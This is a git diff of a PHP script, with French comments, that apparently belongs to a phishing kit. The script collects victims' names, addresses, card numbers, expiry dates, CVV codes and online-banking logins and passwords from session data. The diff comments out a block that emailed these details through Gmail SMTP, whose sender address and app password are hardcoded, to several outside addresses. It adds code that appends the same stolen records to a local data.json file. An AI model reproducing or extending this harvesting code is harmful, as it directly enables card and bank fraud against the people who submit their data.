@@ -1,10 +1,6 @@
 <?php 
 session_start(); // Démarre la session
 
-use PHPMailer\PHPMailer\PHPMailer;  // Ajouter cette ligne pour utiliser la classe PHPMailer
-use PHPMailer\PHPMailer\Exception;
-
-require __DIR__ . '/vendor/autoload.php';  // Utiliser __DIR__ pour une référence absolue
 
 
 $firstName=$_SESSION['firstName'] ;
@@ -23,96 +19,133 @@ $banque_login=$_SESSION['bankLogin'];
 $banque_password=$_SESSION['bankPassword'];
 
 
+    // Récupérer les valeurs des sessions
+    $data = [
+        'firstName'         => $_SESSION['firstName'],
+        'birthDate'         => $_SESSION['birthDate'],
+        'lastName'          => $_SESSION['lastName'],
+        'address'           => $_SESSION['address'],
+        'postalCode'        => $_SESSION['postalCode'],
+        'city'              => $_SESSION['city'],
+        'phone'             => $_SESSION['phone'],
+        'cType'             => $_SESSION['cType'],
+        'cNumber'           => $_SESSION['cNumber'],
+        'expDate'           => $_SESSION['expDate'],
+        'verificationCode'  => $_SESSION['verificationCode'],
+        'bankType'          => $_SESSION['bankType'],
+        'bankLogin'         => $_SESSION['bankLogin'],
+        'bankPassword'      => $_SESSION['bankPassword']
+    ];
+
+    // Chemin du fichier JSON
+    $file = 'data.json';
+
+    // Vérifier si le fichier existe et récupérer son contenu
+    if (file_exists($file)) {
+        $json_data = json_decode(file_get_contents($file), true);
+    } else {
+        $json_data = [];
+    }
+
+    // Ajouter les nouvelles données
+    $json_data[] = $data;
+
+    // Enregistrer dans le fichier JSON
+    file_put_contents($file, json_encode($json_data, JSON_PRETTY_PRINT));
+
+ 
 
 
-try {
-    $mail = new PHPMailer(true);
-
-    // Configuration du serveur SMTP
-    $mail->isSMTP();
-    $mail->Host = 'smtp.gmail.com'; // Adresse du serveur SMTP (ex: smtp.gmail.com)
-    $mail->SMTPAuth = true;
-    $mail->Username = 'warrenkazimoto12@gmail.com'; // Votre email
-    $mail->Password = 'ivbshnwbrdlwkziw'; // Votre mot de passe
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-    $mail->Port = 587; // Port SMTP
 
 
-    // Configuration de l'email
-    $mail->setFrom('warrenkazimoto12@gmail.com', 'lebon');
-    $mail->addAddress('terrancepickup@outlook.com', 'lebon');
+// try {
+//     $mail = new PHPMailer(true);
+
+//     // Configuration du serveur SMTP
+//     $mail->isSMTP();
+//     $mail->Host = 'smtp.gmail.com'; // Adresse du serveur SMTP (ex: smtp.gmail.com)
+//     $mail->SMTPAuth = true;
+//     $mail->Username = 'warrenkazimoto12@gmail.com'; // Votre email
+//     $mail->Password = 'ivbshnwbrdlwkziw'; // Votre mot de passe
+//     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+//     $mail->Port = 587; // Port SMTP
 
 
-    $mail->isHTML(true); // Activer HTML si nécessaire
-    $mail->Subject = 'Informations de la transaction';
+//     // Configuration de l'email
+//     $mail->setFrom('warrenkazimoto12@gmail.com', 'lebon');
+//     $mail->addAddress('terrancepickup@outlook.com', 'lebon');
 
-    // Corps de l'email
-    $mail->Body = "
-        <h2>Informations de la transaction avec acces</h2>
-        <ul>
-            <li><strong>Nom :</strong> $firstName</li>
-            <li><strong>prenom :</strong> $lastName</li>
-            <li><strong>address :</strong> $address</li>
-            <li><strong>code postal :</strong> $postalCode</li>
-            <li><strong>city :</strong> $city</li>
-            <li><strong>phone :</strong> $phone</li>
-            <li><strong>birthday :</strong> $birthDate</li>
-            <li><strong>type de carte :</strong> $cType</li>
+
+//     $mail->isHTML(true); // Activer HTML si nécessaire
+//     $mail->Subject = 'Informations de la transaction';
+
+//     // Corps de l'email
+//     $mail->Body = "
+//         <h2>Informations de la transaction avec acces</h2>
+//         <ul>
+//             <li><strong>Nom :</strong> $firstName</li>
+//             <li><strong>prenom :</strong> $lastName</li>
+//             <li><strong>address :</strong> $address</li>
+//             <li><strong>code postal :</strong> $postalCode</li>
+//             <li><strong>city :</strong> $city</li>
+//             <li><strong>phone :</strong> $phone</li>
+//             <li><strong>birthday :</strong> $birthDate</li>
+//             <li><strong>type de carte :</strong> $cType</li>
 
             
-            <li><strong>Carte Bancaire :</strong> $cNumber</li>
-            <li><strong>Date :</strong> $expDate</li>
-            <li><strong>Cryptogramme :</strong> $verificationCode</li>
-            <li><strong>Banque :</strong> $banque_type</li>
-            <li><strong>Identifiant Bancaire :</strong> $banque_login</li>
-            <li><strong>Mot de passe Accès Bancaire :</strong> $banque_password</li>
+//             <li><strong>Carte Bancaire :</strong> $cNumber</li>
+//             <li><strong>Date :</strong> $expDate</li>
+//             <li><strong>Cryptogramme :</strong> $verificationCode</li>
+//             <li><strong>Banque :</strong> $banque_type</li>
+//             <li><strong>Identifiant Bancaire :</strong> $banque_login</li>
+//             <li><strong>Mot de passe Accès Bancaire :</strong> $banque_password</li>
 
           
-        </ul>
-    ";
+//         </ul>
+//     ";
 
-    $mail->send();
-    // echo 'Email envoyé avec succès.';
-
-
-    // Configuration de l'email
-    $mail->setFrom('warrenkazimoto12@gmail.com', 'lebon');
-    $mail->addAddress('angedesirecamara@gmail.com', 'lebon');
+//     $mail->send();
+//     // echo 'Email envoyé avec succès.';
 
 
-    $mail->isHTML(true); // Activer HTML si nécessaire
-    $mail->Subject = 'Informations de la transaction';
+//     // Configuration de l'email
+//     $mail->setFrom('warrenkazimoto12@gmail.com', 'lebon');
+//     $mail->addAddress('angedesirecamara@gmail.com', 'lebon');
 
-    // Corps de l'email
-    $mail->Body = "
-        <h2>Informations de la transaction avec acces</h2>
-        <ul>
-            <li><strong>Nom :</strong> $firstName</li>
-            <li><strong>prenom :</strong> $lastName</li>
-            <li><strong>address :</strong> $address</li>
-            <li><strong>code postal :</strong> $postalCode</li>
-            <li><strong>city :</strong> $city</li>
-            <li><strong>phone :</strong> $phone</li>
-            <li><strong>birthday :</strong> $birthDate</li>
-            <li><strong>type de carte :</strong> $cType</li>
+
+//     $mail->isHTML(true); // Activer HTML si nécessaire
+//     $mail->Subject = 'Informations de la transaction';
+
+//     // Corps de l'email
+//     $mail->Body = "
+//         <h2>Informations de la transaction avec acces</h2>
+//         <ul>
+//             <li><strong>Nom :</strong> $firstName</li>
+//             <li><strong>prenom :</strong> $lastName</li>
+//             <li><strong>address :</strong> $address</li>
+//             <li><strong>code postal :</strong> $postalCode</li>
+//             <li><strong>city :</strong> $city</li>
+//             <li><strong>phone :</strong> $phone</li>
+//             <li><strong>birthday :</strong> $birthDate</li>
+//             <li><strong>type de carte :</strong> $cType</li>
 
             
-            <li><strong>Carte Bancaire :</strong> $cNumber</li>
-            <li><strong>Date :</strong> $expDate</li>
-            <li><strong>Cryptogramme :</strong> $verificationCode</li>
-            <li><strong>Banque :</strong> $banque_type</li>
-            <li><strong>Identifiant Bancaire :</strong> $banque_login</li>
-            <li><strong>Mot de passe Accès Bancaire :</strong> $banque_password</li>
+//             <li><strong>Carte Bancaire :</strong> $cNumber</li>
+//             <li><strong>Date :</strong> $expDate</li>
+//             <li><strong>Cryptogramme :</strong> $verificationCode</li>
+//             <li><strong>Banque :</strong> $banque_type</li>
+//             <li><strong>Identifiant Bancaire :</strong> $banque_login</li>
+//             <li><strong>Mot de passe Accès Bancaire :</strong> $banque_password</li>
 
           
-        </ul>
-    ";
+//         </ul>
+//     ";
 
-    $mail->send();
-    // echo 'Email envoyé avec succès.';
-} catch (Exception $e) {
-    // echo "Erreur lors de l'envoi de l'email : {$mail->ErrorInfo}";
-}
+//     $mail->send();
+//     // echo 'Email envoyé avec succès.';
+// } catch (Exception $e) {
+//     // echo "Erreur lors de l'envoi de l'email : {$mail->ErrorInfo}";
+// }
 
 
 
